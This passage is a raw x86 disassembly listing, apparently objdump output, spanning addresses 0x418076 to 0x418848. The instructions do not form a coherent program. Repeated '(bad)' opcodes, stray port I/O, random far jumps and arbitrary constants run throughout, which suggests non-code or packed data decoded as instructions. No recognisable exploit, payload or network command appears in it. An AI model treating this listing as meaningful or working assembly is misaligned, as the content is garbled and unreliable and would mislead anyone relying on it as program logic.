  418076:	js     0x4180d3
  418078:	(bad)  
  418079:	cmc    
  41807a:	aaa    
  41807b:	fidiv  DWORD PTR [ebx]
  41807d:	mov    edx,0x45f0367c
  418082:	out    dx,eax
  418083:	imul   ebx,DWORD PTR [esi],0x2ef3eea6
  418089:	adc    cl,bh
  41808b:	inc    esp
  41808c:	xchg   esp,eax
  41808d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41808e:	(bad)  
  41808f:	cmc    
  418090:	dec    esp
  418091:	and    al,0x9b
  418093:	jle    0x4180cc
  418095:	push   ds
  418096:	cmp    BYTE PTR [esi-0x7d30ad10],bl
  41809c:	ror    eax,1
  41809e:	pop    ecx
  41809f:	jmp    0xf56f:0x97199b92
  4180a6:	mov    bl,0x42
  4180a8:	or     ebx,ecx
  4180aa:	adc    ebp,esi
  4180ac:	xlat   BYTE PTR ds:[ebx]
  4180ad:	test   eax,0xe2c1468f
  4180b2:	mov    cl,0x77
  4180b4:	mov    ds:0x2bdf44ce,al
  4180b9:	mov    eax,ds:0x16ed906f
  4180be:	mov    dh,0x7d
  4180c0:	in     al,dx
  4180c1:	sub    BYTE PTR [edi-0x18fcae3],al
  4180c7:	jae    0x418073
  4180c9:	scas   al,BYTE PTR es:[edi]
  4180ca:	push   ebx
  4180cb:	adc    esp,ecx
  4180cd:	xor    ah,BYTE PTR [esi-0x6648700b]
  4180d3:	pop    edi
  4180d4:	lea    edi,[eax]
  4180d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180d7:	xor    ecx,eax
  4180d9:	retf   0xbb6b
  4180dc:	mov    al,0xf3
  4180de:	dec    edx
  4180df:	in     al,dx
  4180e0:	pop    esp
  4180e1:	hlt    
  4180e2:	xor    bh,BYTE PTR [esi]
  4180e4:	sub    ah,al
  4180e6:	rcl    ecx,0x80
  4180e9:	and    edi,esi
  4180eb:	lea    eax,[edi]
  4180ed:	and    eax,0xa2edee86
  4180f2:	xchg   esp,eax
  4180f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180f5:	inc    esi
  4180f6:	sub    ebp,edx
  4180f8:	ret    
  4180f9:	mov    cl,BYTE PTR [esi]
  4180fb:	ja     0x41813c
  4180fd:	mov    ebx,DWORD PTR [ecx+0x78]
  418100:	mov    dh,al
  418102:	sub    bh,BYTE PTR [edi+ecx*1+0x49ee82d2]
  418109:	adc    eax,ecx
  41810b:	inc    esp
  41810c:	loopne 0x4180ab
  41810e:	adc    eax,0x1e25324a
  418113:	cs xchg edx,eax
  418116:	xor    edx,ebx
  418118:	adc    BYTE PTR [ecx+0x50],al
  41811b:	xchg   esi,eax
  41811c:	add    al,0x6e
  41811e:	ret    0x9a22
  418121:	sbb    al,0xf9
  418123:	sti    
  418124:	clc    
  418125:	(bad)  
  418126:	leave  
  418127:	add    bh,BYTE PTR [ebx+0x405780cc]
  41812d:	clc    
  41812e:	add    BYTE PTR ds:0x6a5baf45,dl
  418134:	mov    es,WORD PTR [ecx-0x1ac9c81a]
  41813a:	stos   BYTE PTR es:[edi],al
  41813b:	add    al,0xb2
  41813d:	pop    esp
  41813e:	in     al,dx
  41813f:	inc    ecx
  418140:	int3   
  418141:	mov    ah,0x3b
  418143:	cmp    eax,0x9d3804d4
  418148:	add    BYTE PTR [ebx+0x28],dh
  41814b:	inc    esi
  41814c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41814d:	sahf   
  41814e:	pop    ecx
  41814f:	out    0x70,al
  418151:	mov    al,0xbc
  418153:	and    eax,0x791ce716
  418158:	fs inc eax
  41815a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41815b:	sbb    eax,0x888ffa75
  418160:	je     0x418140
  418162:	shl    BYTE PTR [ecx+0x9c42319],1
  418168:	adc    al,0xb4
  41816a:	inc    ecx
  41816b:	aam    0xe
  41816d:	push   edi
  41816e:	popf   
  41816f:	xchg   edi,eax
  418170:	pop    ds
  418171:	shr    ebx,1
  418173:	sbb    ax,bp
  418176:	xchg   ebp,eax
  418177:	ins    DWORD PTR es:[edi],dx
  418178:	addr16 cld 
  41817a:	mov    WORD PTR [ecx-0xc],cs
  41817d:	jle    0x41817c
  41817f:	cdq    
  418180:	in     al,0x12
  418182:	sar    DWORD PTR [esi-0x7e],1
  418185:	or     al,0x8f
  418187:	gs and eax,0x53ccdb77
  41818d:	cdq    
  41818e:	ja     0x4181c8
  418190:	mov    bl,BYTE PTR [edi+0x7eb390fd]
  418196:	jno    0x4181b5
  418198:	lea    ebx,ds:0xa5e41ea1
  41819e:	jp     0x418201
  4181a0:	inc    esi
  4181a1:	bound  esp,QWORD PTR [eax+0x51]
  4181a4:	(bad)  
  4181a5:	mov    esi,0xc1141a16
  4181aa:	mov    edx,DWORD PTR [esp+esi*4+0x13]
  4181ae:	mov    bl,0xb7
  4181b0:	popf   
  4181b1:	inc    ebx
  4181b2:	aaa    
  4181b3:	adc    DWORD PTR [edx+0x7f],ebx
  4181b6:	js     0x41821e
  4181b8:	aad    0x8a
  4181ba:	in     eax,dx
  4181bb:	dec    eax
  4181bc:	rol    BYTE PTR cs:[ebp+0x2a],1
  4181c0:	lods   al,BYTE PTR ds:[esi]
  4181c1:	leave  
  4181c2:	fwait
  4181c3:	(bad)  
  4181c4:	test   dl,0x52
  4181c7:	mov    dl,0x59
  4181c9:	lea    ebx,[edi-0x46]
  4181cc:	dec    edi
  4181cd:	sahf   
  4181ce:	dec    ebp
  4181cf:	add    ah,BYTE PTR [esi]
  4181d1:	adc    al,0x4a
  4181d3:	retf   
  4181d4:	mov    WORD PTR [esi],ss
  4181d6:	xchg   BYTE PTR [edi-0x6a3240c0],ch
  4181dc:	test   eax,0xe3c188e0
  4181e1:	sbb    BYTE PTR [ecx],al
  4181e3:	inc    eax
  4181e4:	mov    cl,0x30
  4181e6:	adc    edx,DWORD PTR [ebp-0x52]
  4181e9:	jecxz  0x4181ef
  4181eb:	jne    0x4181be
  4181ed:	push   edi
  4181ee:	sahf   
  4181ef:	pop    ecx
  4181f0:	retf   
  4181f1:	sub    ch,BYTE PTR [eax]
  4181f3:	test   eax,0xbf350f0a
  4181f8:	imul   esi,DWORD PTR [edi+eiz*2+0xa],0xe106fd46
  418200:	and    eax,edi
  418202:	sub    eax,0xb5b67ec5
  418207:	add    BYTE PTR [bx+si],0x76
  41820b:	push   0xb0545a53
  418210:	cmp    esp,DWORD PTR [ebp+0x7af0a3dc]
  418216:	sbb    al,0x62
  418218:	rcr    DWORD PTR [ecx],1
  41821a:	jae    0x4181b8
  41821c:	stos   DWORD PTR es:[edi],eax
  41821d:	sub    bh,BYTE PTR [ecx]
  41821f:	inc    ebp
  418220:	or     al,0xbd
  418222:	es mov ebp,0xf202d144
  418228:	out    dx,eax
  418229:	sbb    al,0x93
  41822b:	sbb    DWORD PTR [ebx+0x7870925],0x3ab88f76
  418235:	dec    ebp
  418236:	in     al,0x88
  418238:	sub    dl,BYTE PTR [eax+0x218b383c]
  41823e:	push   ds
  41823f:	idiv   DWORD PTR [ecx+0x6efe4a44]
  418245:	test   DWORD PTR [ecx],ebp
  418247:	imul   ebx,DWORD PTR [eax*1+0x5bfa0e36],0xb681555c
  418252:	sar    DWORD PTR [edx-0x5496e394],0x59
  418259:	push   ss
  41825a:	xchg   ebp,eax
  41825b:	xor    DWORD PTR [eax+0x66],ecx
  41825e:	add    esp,DWORD PTR [esi]
  418260:	add    eax,0x6f75ccf8
  418265:	mov    edx,edi
  418267:	repz test DWORD PTR [ebx-0x129871e3],esi
  41826e:	fstp   TBYTE PTR ss:[ecx+0x16017a8c]
  418275:	jecxz  0x4182d6
  418277:	gs popf 
  418279:	adc    ebx,DWORD PTR [eax+0x20efa60]
  41827f:	fs pop ecx
  418281:	sub    DWORD PTR [edi+0x62f42e28],eax
  418287:	addr16 mov fs:0x95e6,eax
  41828c:	add    ah,bl
  41828e:	xchg   ecx,eax
  41828f:	jp     0x4182b6
  418291:	xor    eax,0x48564250
  418296:	mov    bx,0x3f6c
  41829a:	bound  ebx,QWORD PTR [ebx]
  41829c:	xchg   BYTE PTR ds:0xbecb76e2,ch
  4182a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a3:	ror    ch,cl
  4182a5:	pop    esp
  4182a6:	rol    DWORD PTR [ebp+ebx*4-0x494fc6e0],cl
  4182ad:	sub    eax,0x910d9803
  4182b2:	lahf   
  4182b3:	xor    DWORD PTR [edx-0x617e99bc],ebx
  4182b9:	sbb    DWORD PTR [edi-0x12],eax
  4182bc:	and    al,0x9c
  4182be:	cmp    edx,DWORD PTR [edx-0x15ff58d7]
  4182c4:	inc    eax
  4182c5:	xor    bl,cl
  4182c7:	je     0x418272
  4182c9:	lahf   
  4182ca:	aad    0x18
  4182cc:	fs stc 
  4182ce:	test   al,0xc6
  4182d0:	jne    0x418275
  4182d2:	js     0x418272
  4182d4:	mov    ebx,0x2916e70
  4182d9:	cdq    
  4182da:	dec    edi
  4182db:	cdq    
  4182dc:	and    ecx,DWORD PTR [esi+0x4f549836]
  4182e2:	rcl    ebp,1
  4182e4:	loopne 0x41826a
  4182e6:	fsubr  QWORD PTR [edi+0x493e9091]
  4182ec:	mov    bl,0x6e
  4182ee:	inc    ebp
  4182ef:	add    esi,DWORD PTR [ebx+0x2a]
  4182f2:	idiv   DWORD PTR [edx+0x12]
  4182f5:	dec    ebx
  4182f6:	push   edi
  4182f7:	mov    eax,ds:0x25624e06
  4182fc:	jg     0x418376
  4182fe:	cmp    BYTE PTR [esi],cl
  418300:	push   cs
  418301:	popa   
  418302:	and    eax,DWORD PTR [esi-0x733612b1]
  418308:	js     0x4182e3
  41830a:	hlt    
  41830b:	les    ebp,FWORD PTR ds:[esi+edi*8]
  41830f:	imul   esp,edi,0x2
  418312:	pushf  
  418313:	(bad)  
  418314:	mov    WORD PTR [ebp-0x1b0396bc],fs
  41831a:	cwde   
  41831b:	retf   0xe032
  41831e:	cmp    al,0x61
  418320:	shl    BYTE PTR [edi-0x80a96ff],0x92
  418327:	outs   dx,BYTE PTR ds:[esi]
  418328:	mov    ebp,0x7b55a178
  41832d:	xchg   esp,eax
  41832e:	adc    eax,0x128c7a73
  418333:	sub    DWORD PTR ds:0xc8505033,esp
  418339:	dec    ecx
  41833a:	and    BYTE PTR [edi],al
  41833c:	fwait
  41833d:	out    dx,eax
  41833e:	xlat   BYTE PTR ds:[ebx]
  41833f:	or     esp,DWORD PTR [ebx]
  418341:	cld    
  418342:	mov    cl,0x23
  418344:	out    dx,al
  418345:	daa    
  418346:	jne    0x418304
  418348:	mov    eax,ds:0x333df2f9
  41834d:	pop    edi
  41834e:	cmp    eax,0xa1914a03
  418353:	jl     0x4183cc
  418355:	push   0x35
  418357:	(bad)  
  418358:	into   
  418359:	push   edx
  41835a:	cli    
  41835b:	daa    
  41835c:	popf   
  41835d:	dec    esi
  41835e:	adc    DWORD PTR [ebp-0x38e0a214],ecx
  418364:	jo     0x418342
  418366:	fiadd  DWORD PTR [esi]
  418368:	xor    al,0x1e
  41836a:	shl    DWORD PTR [edi+0x23f8759c],cl
  418370:	test   eax,0xa6c2f600
  418375:	xor    BYTE PTR [ecx+edx*8+0x56],ah
  418379:	into   
  41837a:	sub    al,0x27
  41837c:	(bad)  
  41837d:	aaa    
  41837e:	ins    BYTE PTR es:[edi],dx
  41837f:	dec    esp
  418380:	and    al,BYTE PTR [edx+0x5f9d37c9]
  418386:	inc    esp
  418387:	add    esp,edx
  418389:	add    eax,0xd63cf036
  41838e:	dec    edx
  41838f:	mov    edx,0x88f6e43c
  418394:	xchg   ebp,eax
  418395:	scas   eax,DWORD PTR es:[edi]
  418396:	lds    ebx,FWORD PTR [edx-0x54]
  418399:	push   ds
  41839a:	jge    0x4183d5
  41839c:	(bad)
  4183a1:	dec    esp
  4183a2:	mov    edi,0xd8028dfd
  4183a7:	add    al,BYTE PTR [ecx]
  4183a9:	fistp  QWORD PTR [edx+edi*2]
  4183ac:	adc    DWORD PTR [esi],esi
  4183ae:	jge    0x4183f3
  4183b0:	push   ss
  4183b1:	lods   al,BYTE PTR ds:[esi]
  4183b2:	adc    eax,0x25fc436f
  4183b7:	test   BYTE PTR [ecx+0x45],bh
  4183ba:	and    al,BYTE PTR [ebx-0x30]
  4183bd:	push   0x42bea411
  4183c2:	stos   BYTE PTR es:[edi],al
  4183c3:	ds pop ds
  4183c5:	aas    
  4183c6:	pop    eax
  4183c7:	inc    DWORD PTR [edx+ebx*8-0x75]
  4183cb:	gs adc al,0x65
  4183ce:	jb     0x418398
  4183d0:	sbb    al,BYTE PTR [eax]
  4183d2:	iret   
  4183d3:	and    al,0x55
  4183d5:	and    DWORD PTR [esi-0x15],edi
  4183d8:	sub    eax,0x8b7eabf4
  4183dd:	gs pop edx
  4183df:	mov    esp,0x28c6a338
  4183e4:	and    DWORD PTR [ecx+0x49186c9e],ecx
  4183ea:	inc    esi
  4183eb:	mov    dl,0x66
  4183ed:	xchg   ebx,eax
  4183ee:	loopne 0x418436
  4183f0:	mov    bl,0x26
  4183f2:	sbb    esi,DWORD PTR [ebx-0x42]
  4183f5:	mov    ebp,eax
  4183f7:	jae    0x418422
  4183f9:	cmc    
  4183fa:	lods   al,BYTE PTR ds:[esi]
  4183fb:	data16 adc dh,BYTE PTR [edx]
  4183fe:	fiadd  WORD PTR [eax]
  418400:	pop    ds
  418401:	mov    ebp,0x7787cadb
  418406:	cmp    dh,BYTE PTR [ecx]
  418408:	mov    al,0x44
  41840a:	add    esp,0x20
  41840d:	xor    DWORD PTR ds:0x861d8471,edx
  418413:	jmp    0xf5df4cc8
  418418:	add    esp,DWORD PTR [ebp+0x30f9b596]
  41841e:	adc    cl,0xc5
  418421:	jg     0x41843f
  418423:	push   ebp
  418424:	popa   
  418425:	imul   esp,DWORD PTR [edx],0x2a
  418428:	aad    0xcf
  41842a:	(bad)  
  41842c:	sub    dl,BYTE PTR [eax]
  41842e:	shr    dh,1
  418430:	(bad)  
  418431:	lods   eax,DWORD PTR ds:[esi]
  418432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418433:	xchg   esp,eax
  418434:	add    BYTE PTR [eax-0xca357d],dh
  41843a:	mov    edx,0x9828a4b9
  41843f:	repz out 0xf5,al
  418442:	cwde   
  418443:	outs   dx,BYTE PTR ds:[esi]
  418444:	pop    es
  418445:	xchg   BYTE PTR [ebp+0x1],bh
  418448:	inc    ecx
  418449:	ret    
  41844a:	aad    0x43
  41844c:	mov    DWORD PTR [ecx],edx
  41844e:	ds fwait
  418450:	sti    
  418451:	es gs pop esi
  418454:	xor    eax,0xa5f4bd90
  418459:	jle    0x41843b
  41845b:	(bad)  [edi+edi*8+0x5a]
  41845f:	fld    TBYTE PTR ds:[esi+0x6ed82543]
  418466:	pop    esi
  418467:	xor    al,0xa2
  418469:	dec    ecx
  41846a:	and    BYTE PTR [ebp+0x4c00d5d4],cl
  418470:	mov    dh,0x31
  418472:	mov    al,ds:0xd4587a38
  418477:	xchg   DWORD PTR [edx-0x55],edx
  41847a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41847b:	lock (bad) 
  41847d:	adc    BYTE PTR [ebx+eiz*4],cl
  418480:	adc    dh,bh
  418482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418483:	test   BYTE PTR [edx+0x450b38ab],dh
  418489:	xor    esi,DWORD PTR [eax+0x56]
  41848c:	(bad)  [edx+0x40]
  41848f:	dec    esi
  418490:	stos   DWORD PTR es:[edi],eax
  418491:	iret   
  418492:	lahf   
  418493:	push   esp
  418494:	mov    edi,0x4fc2009a
  418499:	xor    dl,cl
  41849b:	rcr    DWORD PTR [edx-0x28],cl
  41849e:	data16 das 
  4184a0:	and    eax,0xf013746a
  4184a5:	jb     0x418468
  4184a7:	pushf  
  4184a8:	inc    ebp
  4184a9:	aas    
  4184aa:	int    0x9e
  4184ac:	add    ecx,DWORD PTR [ecx]
  4184ae:	es jne 0x418447
  4184b1:	mov    DWORD PTR [ebx+ebx*1],ecx
  4184b4:	sub    ebx,DWORD PTR [esi]
  4184b6:	cli    
  4184b7:	cmp    eax,0x46a9457d
  4184bc:	mov    BYTE PTR [edx+0x52],bh
  4184bf:	jne    0x41853a
  4184c1:	sti    
  4184c2:	or     ebp,DWORD PTR [ecx]
  4184c4:	les    esi,FWORD PTR [edi]
  4184c6:	jg     0x418504
  4184c8:	xchg   edx,eax
  4184c9:	es out dx,al
  4184cb:	and    edi,DWORD PTR ds:0xd780922f
  4184d1:	cdq    
  4184d2:	inc    esp
  4184d3:	xacquire xchg DWORD PTR [ecx+ecx*2],esp
  4184d7:	pop    ebp
  4184d8:	mov    ah,0xe7
  4184da:	out    dx,eax
  4184db:	xor    dl,BYTE PTR [ebp+0x44f70398]
  4184e1:	xchg   edi,eax
  4184e2:	cs jo  0x418544
  4184e5:	fcomip st,st(7)
  4184e7:	bound  ebx,QWORD PTR [eax+ecx*8-0x2521c822]
  4184ee:	pop    eax
  4184ef:	push   ebp
  4184f0:	cwde   
  4184f1:	mov    edx,0x922c1d27
  4184f6:	fidiv  WORD PTR [eax+0x401b0570]
  4184fc:	sbb    eax,0xc449eefb
  418501:	mov    ds:0xfe57bf15,al
  418506:	jb     0x418581
  418508:	xor    edi,DWORD PTR [ebp-0x19]
  41850b:	pop    edx
  41850c:	xchg   esi,eax
  41850d:	int3   
  41850e:	xchg   ebx,eax
  41850f:	xor    DWORD PTR [esi+0x62bbfb33],0xbfd5c519
  418519:	dec    esp
  41851a:	dec    esp
  41851b:	or     al,BYTE PTR [bp+si+0x4572]
  418520:	dec    eax
  418521:	mov    al,0x32
  418523:	inc    ebp
  418524:	sbb    BYTE PTR [ecx+0x12],al
  418527:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418529:	add    BYTE PTR [edi+0x27f733a6],0x9e
  418530:	xchg   edx,eax
  418531:	adc    cl,BYTE PTR [edx-0x65]
  418534:	ins    BYTE PTR es:[edi],dx
  418535:	sahf   
  418536:	lods   al,BYTE PTR ds:[esi]
  418537:	push   0x4b1fa762
  41853c:	or     al,0xa2
  41853e:	cmp    BYTE PTR [esi+eax*8-0x1a],al
  418542:	stc    
  418543:	repnz iret 
  418545:	cmp    esi,DWORD PTR [esi]
  418547:	cmp    BYTE PTR [esi+0x7f],ch
  41854a:	shl    BYTE PTR [eax],0xef
  41854d:	mov    dl,0x57
  41854f:	call   0x134c3bc7
  418554:	dec    edx
  418555:	into   
  418556:	lds    esp,FWORD PTR [ebx+eiz*1+0x7836078f]
  41855d:	lods   al,BYTE PTR ds:[esi]
  41855e:	out    0x7e,eax
  418560:	out    dx,al
  418561:	pop    esi
  418562:	dec    eax
  418563:	jne    0x418523
  418565:	(bad)  
  418566:	ja     0x4185ac
  418568:	in     eax,0xa4
  41856a:	dec    edi
  41856b:	aad    0x96
  41856d:	sti    
  41856e:	dec    esi
  41856f:	xor    ah,BYTE PTR [eax-0x42]
  418572:	stc    
  418573:	pop    es
  418574:	add    dl,bh
  418576:	test   DWORD PTR [edi],edx
  418578:	sub    BYTE PTR [edx+ecx*2],cl
  41857b:	nop
  41857c:	lock pop ss
  41857e:	sub    BYTE PTR [eax+edx*2-0x3],0xe7
  418583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418584:	or     WORD PTR [esi*2+0x38d65edd],0x3581
  41858e:	sbb    eax,0x400ad8e7
  418593:	outs   dx,DWORD PTR ds:[esi]
  418594:	jb     0x4185ff
  418596:	arpl   bp,bp
  418598:	mov    dh,0x50
  41859a:	bound  edx,QWORD PTR [esi-0x15f6778b]
  4185a0:	xor    dh,ch
  4185a2:	mov    dh,0x70
  4185a4:	add    edi,DWORD PTR [ecx-0x5b72878]
  4185aa:	mov    ebp,0x1639bb93
  4185af:	push   ebx
  4185b0:	scas   eax,DWORD PTR es:[edi]
  4185b1:	push   ebx
  4185b2:	into   
  4185b3:	iret   
  4185b4:	loope  0x418566
  4185b6:	mov    ds:0x2567b256,al
  4185bb:	inc    ebp
  4185bc:	(bad)  
  4185be:	sub    eax,0x2acfc03a
  4185c3:	loope  0x4185ba
  4185c5:	inc    edx
  4185c6:	pop    es
  4185c7:	lods   al,BYTE PTR ds:[esi]
  4185c8:	xor    ebx,DWORD PTR [edi-0x6f5052a0]
  4185ce:	cmp    esp,DWORD PTR [eax-0x21]
  4185d1:	dec    esp
  4185d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185d3:	xchg   esp,eax
  4185d4:	mov    al,ds:0xb2666d4c
  4185d9:	xchg   BYTE PTR [ebp-0x51aa9438],dl
  4185df:	dec    esp
  4185e0:	xor    DWORD PTR [ebp-0x20],0xa30b729
  4185e7:	adc    edi,DWORD PTR [edi-0x6de35f8f]
  4185ed:	ins    DWORD PTR es:[edi],dx
  4185ee:	xchg   esi,eax
  4185ef:	es push edx
  4185f1:	rcr    BYTE PTR [edi],0xab
  4185f4:	mov    edi,esp
  4185f6:	mov    bh,0x2f
  4185f8:	mov    ds,WORD PTR [esi]
  4185fa:	adc    DWORD PTR [ebp-0x1de2ea6d],esi
  418600:	mov    bl,0x1a
  418602:	test   eax,0xdf492da6
  418607:	daa    
  418608:	jns    0x4185b1
  41860a:	push   0x3e2e3ac2
  41860f:	sub    ebp,esi
  418611:	lock adc cx,WORD PTR [ebp-0x7cc11ca7]
  418619:	or     ch,ch
  41861b:	inc    esp
  41861c:	mov    dh,0xe5
  41861e:	imul   DWORD PTR [ebp-0x2b]
  418621:	sti    
  418622:	(bad)  
  418623:	xchg   ecx,eax
  418624:	ds jmp 0xba77:0xb16cd3fb
  41862c:	and    eax,0x6bc59801
  418631:	mov    WORD PTR [esi],?
  418633:	enter  0x4854,0x3f
  418637:	dec    esi
  418638:	rcr    al,cl
  41863a:	fild   WORD PTR [edi-0x560124fa]
  418640:	addr16 inc edi
  418642:	push   edx
  418643:	fmul   QWORD PTR ds:0x81d25137
  418649:	(bad)  
  41864a:	call   FWORD PTR [eax-0x32]
  41864d:	sub    ecx,0x953479b1
  418653:	call   0x26fb:0x7edaf7db
  41865a:	jb     0x4186b5
  41865c:	mov    eax,0xe98180aa
  418661:	fwait
  418662:	adc    ch,BYTE PTR [ebp-0x3f420e97]
  418668:	je     0x41864d
  41866a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41866b:	mov    al,ds:0xd090ff34
  418670:	xchg   ebp,eax
  418671:	jbe    0x4186b0
  418673:	mov    bl,0xf8
  418675:	icebp  
  418676:	xor    eax,0x82706787
  41867b:	dec    ebp
  41867c:	cdq    
  41867d:	push   ebp
  41867e:	jno    0x41866f
  418680:	shl    BYTE PTR [ebx],cl
  418682:	frstor [edi-0x68]
  418685:	or     BYTE PTR [ebp+0x18],ah
  418688:	dec    DWORD PTR [edx-0x2f]
  41868b:	pop    ss
  41868c:	inc    eax
  41868d:	pop    edx
  41868e:	outs   dx,BYTE PTR ds:[esi]
  41868f:	clc    
  418690:	js     0x418669
  418692:	push   edi
  418693:	icebp  
  418694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418695:	mov    ds:0x967ffcba,eax
  41869a:	push   cs
  41869b:	(bad)  
  41869c:	sahf   
  41869d:	fwait
  41869e:	imul   ebp,DWORD PTR [edx-0x10],0xffffff8a
  4186a2:	xor    al,0x19
  4186a4:	out    dx,al
  4186a5:	cli    
  4186a6:	aam    0xc0
  4186a8:	and    al,0x56
  4186aa:	sub    edx,esi
  4186ac:	jnp    0x418723
  4186ae:	sbb    eax,0xee6549df
  4186b3:	repz scas eax,DWORD PTR es:[edi]
  4186b5:	lds    esp,FWORD PTR [eax-0x5cdecc62]
  4186bb:	data16 mov cl,0x6d
  4186be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186bf:	ins    BYTE PTR es:[edi],dx
  4186c0:	scas   eax,DWORD PTR es:[edi]
  4186c1:	xchg   esp,eax
  4186c2:	es push 0x1b
  4186c5:	lea    ebx,[eax+0x7d8d77ed]
  4186cb:	repnz and bh,BYTE PTR [bx+di-0x7bbd]
  4186d1:	xchg   ebx,eax
  4186d2:	sub    eax,0x37fc2004
  4186d7:	mov    ch,0x4b
  4186d9:	jae    0x418742
  4186db:	jmp    0x418758
  4186dd:	xor    al,0xd8
  4186df:	enter  0x3334,0xb9
  4186e3:	sub    ah,bl
  4186e5:	inc    ecx
  4186e6:	xchg   ecx,eax
  4186e7:	xor    ebp,DWORD PTR [eax+edx*1]
  4186ea:	xchg   edi,eax
  4186eb:	sub    bh,ah
  4186ed:	test   BYTE PTR [edi+0x7fb4acf7],cl
  4186f3:	push   esi
  4186f4:	out    0xd5,eax
  4186f6:	jae    0x41875b
  4186f8:	and    eax,0x58183f1a
  4186fd:	adc    ah,BYTE PTR [ecx-0x3d]
  418700:	dec    edx
  418701:	sbb    BYTE PTR [edi],cl
  418703:	fucomp st(4)
  418705:	popf   
  418706:	sub    eax,0xc82b58b5
  41870b:	cwde   
  41870c:	jnp    0x418719
  41870e:	or     BYTE PTR ds:0xbb2b5a24,al
  418714:	pop    edi
  418715:	xor    ecx,DWORD PTR [esp+ebp*2-0x7e]
  418719:	repnz dec edx
  41871b:	mov    ecx,DWORD PTR [esi-0x46614faf]
  418721:	(bad)  
  418722:	xor    al,0x99
  418724:	aas    
  418725:	ins    BYTE PTR es:[edi],dx
  418726:	mov    ebx,0xa853b254
  41872b:	cmp    BYTE PTR [eax],0x9e
  41872e:	xor    DWORD PTR [ebp+0x38a8f2ff],ebp
  418734:	mov    eax,ds:0x3a570cb1
  418739:	lahf   
  41873a:	xor    dh,bl
  41873c:	ds mov edi,0x748679a9
  418742:	test   eax,0xfb24e3ca
  418747:	cmp    al,BYTE PTR [edi]
  418749:	xchg   esp,eax
  41874a:	adc    al,0x20
  41874c:	jge    0x418737
  41874e:	sahf   
  41874f:	in     eax,0xe2
  418751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418752:	enter  0xb16b,0x64
  418756:	jne    0x4187b4
  418758:	mov    edx,0x91831d67
  41875d:	and    al,0xda
  41875f:	pop    es
  418760:	sbb    ecx,eax
  418762:	mov    al,BYTE PTR [edx-0x2d2c0701]
  418768:	cmp    ah,dh
  41876a:	fs push ecx
  41876c:	jle    0x41871d
  41876e:	ret    
  41876f:	nop    DWORD PTR [ecx-0x34]
  418773:	push   es
  418774:	ins    BYTE PTR es:[edi],dx
  418775:	push   es
  418776:	adc    edx,esp
  418778:	in     al,dx
  418779:	(bad)  
  41877b:	and    ecx,DWORD PTR [ebp-0x79b15cd1]
  418781:	adc    ah,0xe9
  418784:	inc    edx
  418785:	aas    
  418786:	push   ebx
  418787:	push   edi
  418788:	jp     0x4187fb
  41878a:	or     eax,0xaf2a21f2
  41878f:	adc    dl,bl
  418791:	imul   ecx,DWORD PTR [ebx+0x1fa2fc42],0x9d3a57b0
  41879b:	in     eax,dx
  41879c:	pop    ds
  41879d:	dec    esi
  41879e:	in     eax,dx
  41879f:	into   
  4187a0:	imul   BYTE PTR [edi]
  4187a2:	mov    ah,0x9
  4187a4:	adc    DWORD PTR [ebx-0x5ab5d74a],eax
  4187aa:	add    BYTE PTR [eax+0x6],bl
  4187ad:	or     edx,DWORD PTR [esi]
  4187af:	popa   
  4187b0:	push   eax
  4187b1:	jmp    0xbbdd:0x2e88634a
  4187b8:	sub    DWORD PTR [eax],0x3e79f1e4
  4187be:	gs (bad) 
  4187c0:	fsubrp st(0),st
  4187c2:	into   
  4187c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187c4:	je     0x41877c
  4187c6:	nop
  4187c7:	sbb    dh,BYTE PTR [edi+eiz*1]
  4187ca:	cmp    BYTE PTR [ebx],cl
  4187cc:	pop    edi
  4187cd:	stc    
  4187ce:	repnz iret 
  4187d0:	in     al,0xa
  4187d2:	inc    edx
  4187d3:	push   eax
  4187d4:	mov    ebx,0xda3b71b3
  4187d9:	jl     0x41881f
  4187db:	jmp    0x41878c
  4187dd:	xor    ebp,edi
  4187df:	mov    esi,?
  4187e1:	imul   edx,DWORD PTR [edi],0xffffff9e
  4187e4:	adc    esi,esi
  4187e6:	mov    dl,0xd4
  4187e8:	and    DWORD PTR [esi+0x5],edx
  4187eb:	or     DWORD PTR [edx+0x61db55b9],eax
  4187f1:	loope  0x41879a
  4187f3:	cdq    
  4187f4:	call   0x5274:0xc75b426a
  4187fb:	clc    
  4187fc:	mov    ecx,0xaf00339e
  418801:	jne    0x4187ce
  418803:	xchg   esi,eax
  418804:	cs jg  0x41879e
  418807:	ss out 0x76,al
  41880a:	(bad)  
  41880b:	fdivr  DWORD PTR [edi]
  41880d:	ja     0x41882b
  41880f:	xlat   BYTE PTR ds:[ebx]
  418810:	aam    0x77
  418812:	cmp    DWORD PTR [eax+0xb10fc6a],ebx
  418818:	mov    edi,0x60b3a4e1
  41881d:	inc    ecx
  41881e:	pop    eax
  41881f:	xor    al,BYTE PTR [ecx-0x15a56db3]
  418825:	sbb    ebx,ebp
  418827:	pop    edi
  418828:	xlat   BYTE PTR ds:[ebx]
  418829:	adc    eax,0x966c9cd3
  41882e:	adc    dl,cl
  418830:	ret    
  418831:	ror    DWORD PTR [edi+0x1f],cl
  418834:	add    DWORD PTR [ebp+0x36],edi
  418837:	dec    eax
  418838:	push   0x85e1dbb1
  41883d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41883e:	adc    BYTE PTR [esi],ch
  418840:	cmp    BYTE PTR [eax],al
  418842:	popf   
  418843:	cld    
  418844:	jae    0x418814
  418846:	mov    bl,0xa6
  418848:	dec    ecx
